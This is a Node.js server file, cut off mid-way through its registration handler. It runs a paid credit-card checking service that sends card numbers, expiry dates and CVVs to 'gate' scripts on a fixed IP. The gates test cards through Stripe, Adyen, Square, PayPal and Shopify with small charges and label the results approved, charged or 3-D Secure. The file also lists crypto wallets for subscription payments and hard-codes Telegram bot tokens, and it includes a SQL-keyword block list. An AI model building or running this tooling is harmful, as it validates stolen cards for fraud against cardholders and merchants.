const express = require('express');
const path = require('path');
const fs = require('fs');
const bcrypt = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const multer = require('multer');
const rateLimit = require('express-rate-limit');
const TelegramBot = require('node-telegram-bot-api');
const http = require('http');
const https = require('https');
const crypto = require('crypto');

// ===== PID LOCK (prevent duplicate instances) =====
const PID_FILE = path.join(__dirname, '..', 'server.pid');
if (fs.existsSync(PID_FILE)) {
    const oldPid = parseInt(fs.readFileSync(PID_FILE, 'utf8').trim());
    try { process.kill(oldPid, 0); process.kill(oldPid, 'SIGTERM'); console.log(`[PID] Killed old instance ${oldPid}`); }
    catch (e) { /* already dead */ }
}
fs.writeFileSync(PID_FILE, String(process.pid));
process.on('exit', () => { try { fs.unlinkSync(PID_FILE); } catch {} });
process.on('SIGTERM', () => process.exit(0));
process.on('SIGINT', () => process.exit(0));

// ===== CONFIG =====
const PORT = 3456;
const BOT_TOKEN     = process.env.BOT_TOKEN     || '8850682383:AAGgcH0D1Xs9jJXiQzzQVp5TgFKXpS5Rhog';
const PAY_BOT_TOKEN = process.env.PAY_BOT_TOKEN || '8853294820:AAFI4aP8EJ0uDxtkbq-PKmXDLEVNNIQKI_s';
const ADMIN_ID      = process.env.ADMIN_ID      ? parseInt(process.env.ADMIN_ID)      : 7490574579;
const PAY_GROUP_ID  = ADMIN_ID; // send directly to admin DM
const DB_PATH    = path.join(__dirname, '..', 'data', 'db.json');
const UPLOAD_PATH = path.join(__dirname, '..', 'data', 'uploads');
if (!fs.existsSync(UPLOAD_PATH)) fs.mkdirSync(UPLOAD_PATH, { recursive: true });
const FREE_CREDITS = 30;
const API_DOCS_MIN_CREDITS = 1000;

// Auto-generate strong secrets on first run, persist to disk so tokens survive restarts
function loadOrGenSecret(filename, bytes = 32) {
    const p = path.join(__dirname, '..', 'data', filename);
    try { return fs.readFileSync(p, 'utf8').trim(); } catch {}
    const s = crypto.randomBytes(bytes).toString('hex');
    fs.writeFileSync(p, s, { mode: 0o600 });
    return s;
}
const JWT_SECRET      = process.env.JWT_SECRET      || loadOrGenSecret('.jwt_secret',      32);
const PAY_SECRET      = process.env.PAY_SECRET      || loadOrGenSecret('.pay_secret',      24);
const MASTER_API_KEY  = process.env.MASTER_API_KEY  || loadOrGenSecret('.api_master_key',  32);
const ADMIN_USERNAME  = process.env.ADMIN_USERNAME  || 'admin';
let BOT_USERNAME = process.env.BOT_USERNAME || '';

const WALLETS = {
    USDT_TRC20: 'TNimABcBM4xy4vLTrHPNni6423wG4RrWDy',
    USDT_BEP20: '0x1c64960c4125eb231e179b72f6231e16ea4dfac3',
    LTC:        'ltc1q376u9qnct2575mjejw5hrnw2kh9h9vl8z2j5my',
    BTC:        '36e5KqwTBxnrTH6CjRmYWgHFDvko1WYDf8',
    TRX:        'TNimABcBM4xy4vLTrHPNni6423wG4RrWDy',
    ETH:        '0x1c64960c4125eb231e179b72f6231e16ea4dfac3',
    BNB:        '0x1c64960c4125eb231e179b72f6231e16ea4dfac3',
};

const SUBSCRIPTION_PLANS = {
    basic:   { price: 20, durationDays: 30,  threads: 3,  dailyCredits: 300,  label: 'Basic' },
    premium: { price: 40, durationDays: 60,  threads: 5,  dailyCredits: 700,  label: 'Premium' },
    reign:   { price: 80, durationDays: 150, threads: 10, dailyCredits: 1500, label: 'Reign' },
};

// ===== DATABASE =====
function readDB() {
    try { return JSON.parse(fs.readFileSync(DB_PATH, 'utf8')); }
    catch { return { users: {}, pending: {}, orders: {}, banned: [], banned_ips: [], stats: {}, statsLive: {} }; }
}
function writeDB(data) { fs.writeFileSync(DB_PATH, JSON.stringify(data, null, 2)); invalidateBanCache(); }

// Mutex to prevent concurrent check handlers from overwriting each other's history
let _dbLock = Promise.resolve();
function withDB(fn) {
    _dbLock = _dbLock.then(() => {
        const db = readDB();
        fn(db);
        writeDB(db);
    }).catch(() => {});
    return _dbLock;
}

// ===== BAN CACHE — avoid DB read on every request =====
let _banUsers = new Set(), _banIPs = new Set(), _banTs = 0;
const BAN_TTL = 30_000;
function getBanCache() {
    if (Date.now() - _banTs > BAN_TTL) {
        const db = readDB();
        _banUsers = new Set(db.banned || []);
        _banIPs   = new Set(db.banned_ips || []);
        _banTs    = Date.now();
    }
    return { bannedUsers: _banUsers, bannedIPs: _banIPs };
}
function invalidateBanCache() { _banTs = 0; }

// ===== GATE CONFIG — all costs 0.1cr, Square 0.2cr =====
// timeout: per-gate timeout override in ms (default 20000)
// Last checked: 2026-05-16
//   stripe.php      200 ~1.8s ✅
//   autostripe.php  200 ~0.1s ✅
//   ayden_api.php   200 ~2.9s ✅
//   vbv.php         200 ~0.1s ✅
//   vbv_old.php     200 ~14s  ⚠️ slow — timeout raised to 30s
//   st5$.php        200 ~1.1s ✅
//   st11.php        200 ~8.6s ✅
//   st1.php         200 ~2.2s ✅
//   st3.php         404       ❌ REMOVED — file missing on gate server
//   sq.php          200 ~3.4s ✅
//   pp_charge.php   200 ~16s  ⚠️ slow — timeout raised to 30s
//   pp.php          200 ~5.8s ✅
const GATE_HOST = '104.214.171.212';
const AUTH_GATES = {
    'stripe_auth':  { label: 'Stripe Auth',       url: `http://${GATE_HOST}/stripe.php`,      cost: 0.1 },
    'stripe_auto':  { label: 'Stripe Auto',        url: `http://${GATE_HOST}/autostripe.php`,  cost: 0.1, needSite: true },
    'adyen':        { label: 'Adyen Auth',         url: `http://${GATE_HOST}/ayden_api.php`,   cost: 0.1 },
    'vbv_db':       { label: 'VBV Check (DB)',     url: `http://${GATE_HOST}/vbv.php`,         cost: 0.1 },
    'vbv_api':      { label: 'VBV Check (API)',    url: `http://${GATE_HOST}/vbv_old.php`,     cost: 0.1, timeout: 30000 },
};
const CHARGE_GATES = {
    'stripe5':      { label: 'Stripe Charge $5',  url: `http://${GATE_HOST}/st5$.php`,        cost: 0.1 },
    'stripe_chg':   { label: 'Stripe Charge $1',  url: `http://${GATE_HOST}/st11.php`,        cost: 0.1 },
    'stripe1':      { label: 'Stripe $1',         url: `http://${GATE_HOST}/st1.php`,         cost: 0.1 },
    // stripe_ccn3 (st3.php) REMOVED — returns 404 on gate server
    'square1':      { label: 'Square $1',         url: `http://${GATE_HOST}/sq.php`,          cost: 0.2 },
    'paypal1':      { label: 'PayPal $1',         url: `http://${GATE_HOST}/pp_charge.php`,   cost: 0.1, timeout: 30000 },
    'paypal_wp1':   { label: 'PayPal WP $1',      url: `http://${GATE_HOST}/pp.php`,          cost: 0.1 },
    'shopify':      { label: 'Shopify Auto',      url: `http://${GATE_HOST}:3636/`,           cost: 0.1, needSite: true, needProxy: true },
};

// ===== GATE CALLER =====
function callGate(url, timeoutMs = 20000) {
    return new Promise((resolve, reject) => {
        const req = http.get(url, (res) => {
            let body = '';
            res.on('data', chunk => body += chunk);
            res.on('end', () => resolve(body.trim()));
        });
        req.on('error', reject);
        req.setTimeout(timeoutMs, () => { req.destroy(); reject(new Error('timeout')); });
    });
}
function parseGateResponse(body) {
    let json = null;
    try { json = JSON.parse(body); } catch {}

    if (json && json.status) {
        const s   = String(json.status).toLowerCase();
        const raw = String(json.message || json.response || '').trim();
        // Clean message: strip Stripe "msg | code" suffix
        const msg = (raw.includes(' | ') ? raw.split(' | ')[0] : raw).substring(0, 90).trim();
        const ml  = raw.toLowerCase();

        if (s === 'approved' || s === 'live' || s === 'success')
            return { status: 'APPROVED', response: msg || 'Approved' };
        if (s === 'charged' || s === 'captured')
            return { status: 'CHARGED', response: msg || 'Charged' };
        if (s === '3ds' || s === 'vbv' || s === '3ds_required' || s === '3d_secure')
            return { status: 'VBV', response: msg || '3D Secure required' };

        // status=error/declined but message mentions 3DS → classify as VBV
        if (ml.includes('3d secure') || ml.includes('3ds') ||
            ml.includes('authentication_required') || ml.includes('authentication required') ||
            ml.includes('challenge') || ml.includes('enrolled'))
            return { status: 'VBV', response: msg || '3D Secure' };

        return { status: 'DECLINED', response: msg || s };
    }

    // Fallback for plain-text gate responses
    const t = (body || '').toLowerCase();
    const fb = body.substring(0, 90);
    if (t.includes('approved') || t.includes('amount_capturable') || t.includes('captured_value'))
        return { status: 'APPROVED', response: fb };
    if (t.includes('charged') || t.includes('captured'))
        return { status: 'CHARGED', response: fb };
    if (t.includes('3d secure') || t.includes('3ds') || t.includes('authentication required') ||
        t.includes('authentication failed') || t.includes('challenge required') || t.includes('enrolled'))
        return { status: 'VBV', response: fb };
    return { status: 'DECLINED', response: fb };
}


// ===== INPUT VALIDATORS =====
function validateCard(cc, mm, yy, cvv) {
    if (!/^\d{13,19}$/.test(cc))     return 'Invalid card number format (13-19 digits).';
    const mo = parseInt(mm, 10);
    if (!/^\d{1,2}$/.test(mm) || mo < 1 || mo > 12) return 'Invalid expiry month (01-12).';
    const yr = parseInt(yy, 10);
    const fy = yr < 100 ? 2000 + yr : yr;
    const cy = new Date().getFullYear();
    if (!/^\d{2,4}$/.test(yy) || fy < cy || fy > cy + 25) return 'Card expired or invalid year.';
    if (!/^\d{3,4}$/.test(cvv)) return 'Invalid CVV (3-4 digits).';
    return null;
}
function isValidSiteUrl(s) {
    if (!s) return true; // optional field
    try { const u = new URL(s); return u.protocol === 'http:' || u.protocol === 'https:'; }
    catch { return false; }
}

// ===== VN CARD DETECTION =====
// VN domestic Napas cards start with 9704
// Ban user immediately if checking a VN card
function isVNCard(cc) {
    const cleaned = cc.replace(/\D/g, '');
    return cleaned.startsWith('9704');
}

// ===== STATS TRACKING =====
const onlineUsers = new Map(); // username -> lastSeen ms
function touchOnline(username) {
    onlineUsers.set(username, Date.now());
}
function getOnlineCount() {
    const cutoff = Date.now() - 5 * 60 * 1000;
    let count = 0;
    for (const [, t] of onlineUsers) { if (t > cutoff) count++; }
    return count;
}
function recordCheck(isLive) {
    const db = readDB();
    const today = new Date().toISOString().substring(0, 10);
    if (!db.stats) db.stats = {};
    if (!db.statsLive) db.statsLive = {};
    db.stats[today] = (db.stats[today] || 0) + 1;
    if (isLive) db.statsLive[today] = (db.statsLive[today] || 0) + 1;
    writeDB(db);
}

// ===== MATH CAPTCHA (harder — larger numbers, multiplication, IP binding) =====
const captchaStore = new Map(); // id -> { answer, exp, ip }
function makeCaptcha(ip) {
    // Random operands in wider range to prevent brute force
    const a = Math.floor(Math.random() * 40) + 5;        // 5-44
    const b = Math.floor(Math.random() * 20) + 2;        // 2-21
    const ops = ['+', '-', '*', '+', '+', '-'];           // weighted: + most common, * exists
    const op  = ops[Math.floor(Math.random() * ops.length)];
    const answer = op === '+' ? a + b : op === '-' ? a - b : a * b;
    const id = crypto.randomBytes(12).toString('hex');    // 24-char hex, harder to guess
    // TTL 8 min (shorter = smaller attack window), bind to client IP
    captchaStore.set(id, { answer, exp: Date.now() + 8 * 60 * 1000, ip: ip || '' });
    return { id, q: `${a} ${op} ${b}` };
}
function verifyCaptcha(id, ans, ip) {
    const stored = captchaStore.get(id);
    if (!stored) return false;
    if (Date.now() > stored.exp) { captchaStore.delete(id); return false; }
    // IP binding: reject if issued to a different IP (empty ip = old client without header, allow)
    if (stored.ip && ip && stored.ip !== ip) { captchaStore.delete(id); return false; }
    captchaStore.delete(id); // single-use — always delete after first verify attempt
    return parseInt(ans, 10) === stored.answer;
}
// Clean expired captchas every 10 min
setInterval(() => {
    const now = Date.now();
    for (const [k, v] of captchaStore) { if (now > v.exp) captchaStore.delete(k); }
}, 10 * 60 * 1000);

// ===== ANTI-SPAM MODULE (POST /api/register only) =====
// GET requests (loading register page) are never counted.
// Captcha failure → temporary cooldown, never a permanent ban.
// IP quota only increments when registration actually SUCCEEDS.
const ANTISPAM = {
    // ip -> [timestamps] of POST /register requests this window
    regAttempts:     new Map(),
    // ip -> [timestamps] of SUCCESSFUL registrations in 24 h
    regSuccess:      new Map(),
    // ip -> expiry timestamp of captcha-fail cooldown
    captchaCooldown: new Map(),

    MAX_ATTEMPTS_PER_HOUR: 10,    // max POST attempts before temp block
    MAX_SUCCESS_PER_DAY:   3,     // max accounts created per IP per 24 h
    ATTEMPT_WINDOW:   60 * 60 * 1000,       // 1 h
    SUCCESS_WINDOW:   24 * 60 * 60 * 1000,  // 24 h
    CAPTCHA_COOLDOWN: 60 * 1000,            // 60 s after wrong captcha

    _fresh(map, ip, window) {
        const now = Date.now();
        const times = (map.get(ip) || []).filter(t => now - t < window);
        map.set(ip, times);
        return times;
    },

    // Returns { ok, reason, retryAfter? }
    canAttempt(ip) {
        const now = Date.now();
        const capExp = this.captchaCooldown.get(ip);
        if (capExp && now < capExp) {
            return { ok: false, reason: 'captcha_cooldown', retryAfter: Math.ceil((capExp - now) / 1000) };
        }
        const attempts = this._fresh(this.regAttempts, ip, this.ATTEMPT_WINDOW);
        if (attempts.length >= this.MAX_ATTEMPTS_PER_HOUR) {
            const retryAfter = Math.ceil((attempts[0] + this.ATTEMPT_WINDOW - now) / 1000);
            return { ok: false, reason: 'too_many_attempts', retryAfter };
        }
        return { ok: true };
    },

    recordAttempt(ip) {
        const attempts = this._fresh(this.regAttempts, ip, this.ATTEMPT_WINDOW);
        attempts.push(Date.now());
        this.regAttempts.set(ip, attempts);
    },

    // Returns { ok, reason, retryAfter?, count }
    canRegister(ip) {
        const successes = this._fresh(this.regSuccess, ip, this.SUCCESS_WINDOW);
        if (successes.length >= this.MAX_SUCCESS_PER_DAY) {
            const retryAfter = Math.ceil((successes[0] + this.SUCCESS_WINDOW - Date.now()) / 1000);
            return { ok: false, reason: 'account_quota', count: successes.length, retryAfter };
        }
        return { ok: true, count: successes.length };
    },

    // Only called on SUCCESSFUL account creation
    recordSuccess(ip) {
        const successes = this._fresh(this.regSuccess, ip, this.SUCCESS_WINDOW);
        successes.push(Date.now());
        this.regSuccess.set(ip, successes);
    },

    recordCaptchaFail(ip) {
        this.captchaCooldown.set(ip, Date.now() + this.CAPTCHA_COOLDOWN);
        this.log(ip, 'POST /api/register', 'captcha_fail', { cooldown: '60s' });
    },

    log(ip, route, reason, extras = {}) {
        const now = new Date().toISOString();
        const att = this._fresh(this.regAttempts, ip, this.ATTEMPT_WINDOW).length;
        const suc = this._fresh(this.regSuccess,  ip, this.SUCCESS_WINDOW).length;
        const capExp = this.captchaCooldown.get(ip);
        const capLeft = capExp ? Math.max(0, Math.ceil((capExp - Date.now()) / 1000)) : 0;
        console.log(`[ANTISPAM] ${now} ip=${ip} route=${route} reason=${reason} attempts_1h=${att} success_24h=${suc} captcha_cooldown=${capLeft}s`, Object.keys(extras).length ? extras : '');
    },

    // Auto-expire stale entries — runs every 30 min
    cleanup() {
        const now = Date.now();
        for (const [ip, times] of this.regAttempts) {
            const f = times.filter(t => now - t < this.ATTEMPT_WINDOW);
            if (!f.length) this.regAttempts.delete(ip); else this.regAttempts.set(ip, f);
        }
        for (const [ip, times] of this.regSuccess) {
            const f = times.filter(t => now - t < this.SUCCESS_WINDOW);
            if (!f.length) this.regSuccess.delete(ip); else this.regSuccess.set(ip, f);
        }
        for (const [ip, exp] of this.captchaCooldown) {
            if (now > exp) this.captchaCooldown.delete(ip);
        }
        console.log(`[ANTISPAM] cleanup done — tracking ${this.regAttempts.size} attempt IPs, ${this.regSuccess.size} success IPs`);
    }
};
setInterval(() => ANTISPAM.cleanup(), 30 * 60 * 1000);

// ===== DAILY CREDITS DISTRIBUTION =====
// Runs every 5 min; distributes once per UTC day per subscriber
setInterval(() => {
    const today = new Date().toISOString().substring(0, 10);
    const db = readDB();
    let changed = false;
    Object.values(db.users).forEach(u => {
        const plan = SUBSCRIPTION_PLANS[u.plan];
        if (!plan) return;
        if (u.planExpiry && new Date(u.planExpiry) < new Date()) {
            u.plan = 'free'; u.planExpiry = null; changed = true; return;
        }
        if (u.lastDailyCredit === today) return;
        u.credits = Math.round((u.credits + plan.dailyCredits) * 100) / 100;
        u.lastDailyCredit = today;
        changed = true;
    });
    if (changed) writeDB(db);
}, 5 * 60 * 1000);

// ===== PER-USERNAME LOGIN BRUTE-FORCE (lock after 5 failures for 30 min) =====
const loginFail = new Map();
function checkLoginLock(username) {
    const rec = loginFail.get(username);
    if (rec && rec.lockUntil > Date.now()) return Math.ceil((rec.lockUntil - Date.now()) / 1000);
    return 0;
}
function recordLoginFail(username) {
    const rec = loginFail.get(username) || { count: 0, lockUntil: 0 };
    rec.count++;
    if (rec.count >= 5) { rec.lockUntil = Date.now() + 30 * 60 * 1000; rec.count = 0; }
    loginFail.set(username, rec);
}
function clearLoginFail(username) { loginFail.delete(username); }

// ===== FILE UPLOAD =====
const storage = multer.diskStorage({
    destination: (req, file, cb) => cb(null, UPLOAD_PATH),
    filename: (req, file, cb) => {
        const ext = path.extname(file.originalname).toLowerCase();
        cb(null, `${Date.now()}_${crypto.randomBytes(6).toString('hex')}${ext}`);
    }
});
const upload = multer({
    storage,
    limits: { fileSize: 5 * 1024 * 1024 },
    fileFilter: (req, file, cb) => {
        const ext = path.extname(file.originalname).toLowerCase();
        const mime = file.mimetype;
        if (['.php', '.exe', '.sh', '.py', '.js', '.html'].includes(ext)) {
            const authHeader = req.headers.authorization;
            if (authHeader) {
                try {
                    const token = authHeader.replace('Bearer ', '');
                    const decoded = jwt.verify(token, JWT_SECRET);
                    const db = readDB();
                    if (!db.banned) db.banned = [];
                    if (!db.banned.includes(decoded.username)) {
                        db.banned.push(decoded.username);
                        writeDB(db);
                    }
                } catch {}
            }
            return cb(new Error('BANNED'));
        }
        if (!['image/png','image/jpeg','image/jpg'].includes(mime) || !['.png','.jpg','.jpeg'].includes(ext)) {
            return cb(new Error('Only .png/.jpg files allowed'));
        }
        cb(null, true);
    }
});

// ===== EXPRESS =====
const app = express();

// ===== SECURITY HEADERS =====
app.use((req, res, next) => {
    res.setHeader('X-Content-Type-Options', 'nosniff');
    res.setHeader('X-Frame-Options', 'DENY');
    res.setHeader('X-XSS-Protection', '1; mode=block');
    res.setHeader('Referrer-Policy', 'no-referrer');
    res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=()');
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Content-Security-Policy', "default-src 'self' https: data: 'unsafe-inline' 'unsafe-eval'; img-src 'self' data: blob:;");
    res.removeHeader('X-Powered-By');
    next();
});

// ===== RATE LIMITERS (separated per route — never share between register/login/api) =====
// Register: loose HTTP-level guard — ANTISPAM handles the real logic below
const registerLimiter = rateLimit({ windowMs: 60_000, max: 20,  standardHeaders: false, legacyHeaders: false, skip: (req) => req.method === 'GET' });
// Login: brute-force guard (username lockout handles finer-grained lock)
const loginLimiter    = rateLimit({ windowMs: 60_000, max: 30,  standardHeaders: false, legacyHeaders: false });
// Captcha endpoint: loose — just prevents DDOS
const captchaLimiter  = rateLimit({ windowMs: 60_000, max: 60,  standardHeaders: false, legacyHeaders: false });
// API checker routes: generous — must not affect paying users' throughput
const apiLimiter      = rateLimit({ windowMs: 60_000, max: 300, standardHeaders: false, legacyHeaders: false });
const checkLimiter    = rateLimit({ windowMs: 60_000, max: 300, standardHeaders: false, legacyHeaders: false });
// Internal calls: very generous — local only anyway
const internalLimiter = rateLimit({ windowMs: 60_000, max: 500, standardHeaders: false, legacyHeaders: false });
// Keep authLimiter as alias so existing usages don't break
const authLimiter = loginLimiter;

// ===== CLIENT IDENTITY MIDDLEWARE (checker routes only) =====
// All requests to /api/check/* and /api/shopify/* must include X-TTC-Client header.
// The dashboard adds this header to every fetch call.
// Curl/Postman/bots without the header will get 403.
// This also soft-verifies the JWT's embedded IP matches the request IP.
function clientGuard(req, res, next) {
    if (req.headers['x-ttc-client'] !== '1') {
        return res.status(403).json({ success: false, message: 'Forbidden.' });
    }
    // Soft IP binding: if JWT has ip claim and it differs → reject
    const authHeader = req.headers.authorization;
    if (authHeader) {
        try {
            const decoded = jwt.verify(authHeader.replace('Bearer ', ''), JWT_SECRET);
            if (decoded.ip) {
                const reqIp = (req.ip || req.socket.remoteAddress || '').replace('::ffff:', '');
                if (decoded.ip !== reqIp) {
                    console.log(`[GUARD] IP mismatch: token=${decoded.ip} req=${reqIp} user=${decoded.username}`);
                    return res.status(403).json({ success: false, message: 'Session IP mismatch. Please log in again.' });
                }
            }
        } catch { /* jwt.verify will fail again in authMiddleware, ignore here */ }
    }
    next();
}

// ===== CHECK COOLDOWN (40s after a batch ends — debounce resets on each card) =====
const CHECK_COOLDOWN_MS = 40 * 1000;
const checkCooldown = new Map();
function getCooldownRemaining(username) {
    const exp = checkCooldown.get(username) || 0;
    return Math.max(0, Math.ceil((exp - Date.now()) / 1000));
}
function setCheckCooldown(username) {
    checkCooldown.set(username, Date.now() + CHECK_COOLDOWN_MS);
}

// ===== BAN CHECK MIDDLEWARE (API routes only — never blocks static pages) =====
// GET /register, GET /login, GET /dashboard are NOT checked here.
// A banned IP must still be able to load the HTML pages; only API calls are rejected.
// This prevents the false-positive where a user can't even see the register form.
app.use('/api', (req, res, next) => {
    const { bannedUsers, bannedIPs } = getBanCache();
    const ip = (req.ip || req.connection.remoteAddress || '').replace('::ffff:', '');
    if (bannedIPs.has(ip)) {
        console.log(`[BAN] Blocked API request from banned IP: ${ip} ${req.method} ${req.path}`);
        return res.status(403).json({ success: false, message: 'Access denied.' });
    }
    const authHeader = req.headers.authorization;
    if (authHeader) {
        try {
            const token = authHeader.replace('Bearer ', '');
            const decoded = jwt.verify(token, JWT_SECRET);
            if (bannedUsers.has(decoded.username)) {
                return res.status(403).json({ success: false, message: 'Account banned.' });
            }
        } catch {}
    }
    next();
});

// ===== INPUT SANITIZER =====
function sanitize(val) {
    if (typeof val !== 'string') return val;
    return val
        .replace(/[<>'"`;\\]/g, '')
        .replace(/(\b(SELECT|INSERT|UPDATE|DELETE|DROP|UNION|ALTER|CREATE|EXEC|EXECUTE|CAST|CONVERT|CHAR|NCHAR|VARCHAR|NVARCHAR|XP_|SP_|DECLARE|CURSOR|FETCH|KILL|BACKUP|RESTORE|BULK|OPENROWSET|WAITFOR|SLEEP|BENCHMARK|LOAD_FILE|OUTFILE|DUMPFILE|INTO)\b)/gi, '')
        .trim()
        .substring(0, 500);
}
const SKIP_SANITIZE = new Set(['password', 'captchaAnswer', 'txid']);
function sanitizeBody(req, res, next) {
    if (req.body && typeof req.body === 'object') {
        for (const key of Object.keys(req.body)) {
            if (typeof req.body[key] === 'string' && !SKIP_SANITIZE.has(key)) {
                req.body[key] = sanitize(req.body[key]);
            }
        }
    }
    next();
}

app.use(cors({ origin: false }));
app.use(express.json({ limit: '10kb' }));
app.use(sanitizeBody);

// ===== INTERNAL-ONLY MIDDLEWARE (localhost + secret header) =====
function internalOnly(req, res, next) {
    const ip = (req.ip || req.socket?.remoteAddress || '').replace('::ffff:', '');
    if (ip !== '127.0.0.1' && ip !== '::1') {
        return res.status(403).json({ success: false, message: 'Forbidden.' });
    }
    if (req.headers['x-pay-secret'] !== PAY_SECRET) {
        return res.status(403).json({ success: false, message: 'Forbidden.' });
    }
    next();
}

// ===== STATIC + ROUTES (no .html in URLs) =====
app.get('/dashboard', (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'dashboard.html')));
app.get('/login',     (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'login.html')));
app.get('/register',  (req, res) => res.sendFile(path.join(__dirname, '..', 'public', 'register.html')));
// Permanent redirects from old .html URLs
app.get('/dashboard.html', (req, res) => res.redirect(301, '/dashboard'));
app.get('/login.html',     (req, res) => res.redirect(301, '/login'));
app.get('/register.html',  (req, res) => res.redirect(301, '/register'));
app.get('/dash',           (req, res) => res.redirect(301, '/dashboard'));
app.use(express.static(path.join(__dirname, '..', 'public')));
// Uploads require auth (payment screenshots are sensitive)
app.use('/uploads', (req, res, next) => {
    const token = (req.headers.authorization || '').replace('Bearer ', '') || req.query.t;
    if (!token) return res.status(401).end();
    try { jwt.verify(token, JWT_SECRET); next(); }
    catch { res.status(403).end(); }
}, express.static(UPLOAD_PATH));

// ===== AUTH MIDDLEWARE =====
function authMiddleware(req, res, next) {
    // ── API Key auth (X-API-Key header) ──────────────────────────────────────
    const apiKey = req.headers['x-api-key'];
    if (apiKey) {
        if (apiKey === MASTER_API_KEY) {
            const db = readDB();
            const adminUser = db.users[ADMIN_USERNAME] || { username: ADMIN_USERNAME, credits: 999999, plan: 'admin' };
            req.user = adminUser; req.username = ADMIN_USERNAME; req.isApiKey = true;
            return next();
        }
        const db = readDB();
        const entry = (db.apiKeys || []).find(k => k.key === apiKey && k.active !== false);
        if (entry) {
            const user = db.users[entry.username];
            if (!user) return res.status(401).json({ success: false, message: 'API key user not found.' });
            if (db.banned?.includes(entry.username)) return res.status(403).json({ success: false, message: 'Account banned.' });
            entry.lastUsed = new Date().toISOString();
            entry.requestCount = (entry.requestCount || 0) + 1;
            writeDB(db);
            req.user = user; req.username = entry.username; req.isApiKey = true;
            return next();
        }
        return res.status(401).json({ success: false, message: 'Invalid API key.' });
    }
    // ── JWT Bearer auth ───────────────────────────────────────────────────────
    const authHeader = req.headers.authorization;
    if (!authHeader) return res.status(401).json({ success: false, message: 'Not authenticated.' });
    try {
        const token = authHeader.replace('Bearer ', '');
        const decoded = jwt.verify(token, JWT_SECRET);
        const db = readDB();
        const user = db.users[decoded.username];
        if (!user) return res.json({ success: false, message: 'User not found.' });
        if (db.banned?.includes(decoded.username)) return res.json({ success: false, message: 'Account banned.' });
        req.user = user; req.username = decoded.username;
        touchOnline(decoded.username);
        next();
    } catch { res.json({ success: false, message: 'Invalid token.' }); }
}
function adminMiddleware(req, res, next) {
    if (req.username !== ADMIN_USERNAME && !req.user?.isAdmin)
        return res.status(403).json({ success: false, message: 'Admin only.' });
    next();
}
function deductCredit(username, amount = 1) {
    const db = readDB();
    if (!db.users[username]) return false;
    if (db.users[username].credits < amount) return false;
    db.users[username].credits = Math.round((db.users[username].credits - amount) * 100) / 100;
    writeDB(db);
    return true;
}
function refundCredit(username, amount) {
    const db = readDB();
    if (!db.users[username]) return;
    db.users[username].credits = Math.round((db.users[username].credits + amount) * 100) / 100;
    writeDB(db);
}

// ===== CONFIG (public) =====
app.get('/api/config', (req, res) => {
    res.json({ botUsername: BOT_USERNAME });
});

// ===== TELEGRAM CODE VERIFY =====
// In-memory: code -> { tgId, tgUsername, tgFirstName, exp, verified, ip }
const tgVerifyCodes = new Map();
const TG_CODE_CHARS = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789';
function genVerifyCode() {
    const bytes = crypto.randomBytes(6);
    let code = '';
    for (let i = 0; i < 6; i++) code += TG_CODE_CHARS[bytes[i] % TG_CODE_CHARS.length];
    return code;
}
// Clean up expired codes every minute
setInterval(() => {
    const now = Date.now();
    for (const [code, v] of tgVerifyCodes) { if (now > v.exp) tgVerifyCodes.delete(code); }
}, 60_000);

// Per-IP rate limit: 3 code requests per 10 minutes
const tgVerifyRateMap = new Map();
function canRequestVerifyCode(ip) {
    const now = Date.now();
    const entry = tgVerifyRateMap.get(ip) || { count: 0, resetAt: now + 10 * 60 * 1000 };
    if (now > entry.resetAt) { entry.count = 0; entry.resetAt = now + 10 * 60 * 1000; }
    if (entry.count >= 3) return false;
    entry.count++;
    tgVerifyRateMap.set(ip, entry);
    return true;
}

// POST /api/tgverify/request — generate code for the IP
app.post('/api/tgverify/request', (req, res) => {
    const ip = (req.ip || req.socket.remoteAddress || '').replace('::ffff:', '');
    if (!canRequestVerifyCode(ip)) return res.json({ success: false, message: 'Too many code requests. Try again in 10 minutes.' });

    // Invalidate any previous unverified code from this IP
    for (const [code, v] of tgVerifyCodes) { if (v.ip === ip && !v.verified) tgVerifyCodes.delete(code); }

    const code = genVerifyCode();
    tgVerifyCodes.set(code, { tgId: null, tgUsername: null, tgFirstName: null, exp: Date.now() + 5 * 60 * 1000, verified: false, ip });
    res.json({ success: true, code, expiresIn: 300 });
});

// GET /api/tgverify/status/:code — poll for verification result
app.get('/api/tgverify/status/:code', (req, res) => {
    const code = (req.params.code || '').toUpperCase();
    const entry = tgVerifyCodes.get(code);
    if (!entry) return res.json({ success: false, status: 'not_found' });
    if (Date.now() > entry.exp) { tgVerifyCodes.delete(code); return res.json({ success: false, status: 'expired' }); }
    if (entry.verified) return res.json({ success: true, status: 'verified', tgUsername: entry.tgUsername, tgFirstName: entry.tgFirstName });
    res.json({ success: true, status: 'pending' });
});

// ===== CAPTCHA =====
app.get('/api/captcha', captchaLimiter, (req, res) => {
    const ip = (req.ip || req.socket.remoteAddress || '').replace('::ffff:', '');
    const { id, q } = makeCaptcha(ip);
    res.json({ success: true, id, q });
});

// ===== REGISTER =====
app.post('/api/register', registerLimiter, async (req, res) => {
    const ip = (req.ip || req.socket.remoteAddress || 'unknown').replace('::ffff:', '');
    const { username, email, password, captchaId, captchaAnswer, tgVerifyCode } = req.body;

    // 1. Captcha cooldown check only (no IP quota limit)
    const attemptCheck = ANTISPAM.canAttempt(ip);
    if (!attemptCheck.ok) {
        ANTISPAM.log(ip, 'POST /api/register', attemptCheck.reason, { retryAfter: attemptCheck.retryAfter });
        const msg = attemptCheck.reason === 'captcha_cooldown'
            ? `Captcha failed. Please wait ${attemptCheck.retryAfter}s and try again.`
            : `Too many registration attempts. Try again in ${Math.ceil(attemptCheck.retryAfter / 60)} min.`;
        return res.json({ success: false, message: msg });
    }

    // 2. Field validation
    if (!username || !password || !email) return res.json({ success: false, message: 'All fields are required.' });
    if (username.length < 3 || username.length > 20) return res.json({ success: false, message: 'Username must be 3-20 characters.' });
    if (!/^[a-zA-Z0-9_]+$/.test(username)) return res.json({ success: false, message: 'Username: letters, numbers, underscore only.' });
    if (password.length < 6) return res.json({ success: false, message: 'Password must be at least 6 characters.' });
    if (!captchaId || captchaAnswer === undefined) return res.json({ success: false, message: 'Captcha required.' });

    // 3. Telegram verification required
    if (!tgVerifyCode) return res.json({ success: false, message: 'Telegram verification required.' });
    const tgCode = String(tgVerifyCode).toUpperCase();
